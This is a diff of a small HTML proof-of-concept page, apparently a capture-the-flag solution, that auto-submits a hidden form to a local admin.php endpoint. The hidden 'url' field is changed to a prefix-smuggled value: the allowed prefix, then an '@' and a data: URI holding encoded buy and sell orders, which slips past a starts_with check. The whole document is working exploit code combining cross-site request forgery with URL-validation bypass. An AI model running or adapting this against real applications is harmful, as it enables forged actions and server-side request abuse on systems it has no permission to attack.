@@ -2,10 +2,9 @@
 <meta charset="utf-8">
 <title>ctf poc</title>
 <form id="f" method="post" action="http://localhost:5000/admin.php">
-  <!-- Prefix-smuggled URL: passes starts_with("http://localhost:5000/admin.php") but actually fetches YOUR host -->
-  <input type="hidden" name="url" value="http://localhost:5000/admin.php">
+  <input type="hidden" name="url"
+   value="http://localhost:5000/admin.php@data:text/plain,-%20amount:%201000000%0A%20%20currency:%20ZZZ%0A%20%20op:%20BUY%0A-%20amount:%201000000%0A%20%20currency:%20ZZZ%0A%20%20op:%20SELL%0A-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20BUY">
 </form>
 <script>
-  // Fire the POST immediately
   document.getElementById('f').submit();
 </script>
